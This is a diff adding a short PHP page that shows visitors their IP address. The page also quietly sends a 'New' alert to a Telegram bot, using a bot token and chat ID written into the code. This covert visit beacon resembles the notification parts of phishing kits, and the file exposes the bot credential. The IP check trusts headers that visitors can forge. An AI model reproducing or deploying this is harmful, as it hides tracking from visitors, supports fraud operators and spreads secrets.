@@ -1,0 +1,32 @@
+<?php
+ 
+// Function to get the client IP address
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+ 
+ 
+echo "Your IP address is: " . get_client_ip();
+$ipad = get_client_ip();
+$msgg="<b>♻️ New </b>";
+$mess=urlencode($msgg);
+
+$url999="https://api.telegram.org/bot5774177678:AAHpb_GLKfTUlqlvu8ErWpSGZfG7TSUZTag/sendMessage?chat_id=5052518890&text=$mess&parse_mode=Html";
+
+
+file_get_contents("https://api.telegram.org/bot5774177678:AAHpb_GLKfTUlqlvu8ErWpSGZfG7TSUZTag/sendMessage?chat_id=5052518890&text=$mess&parse_mode=Html");
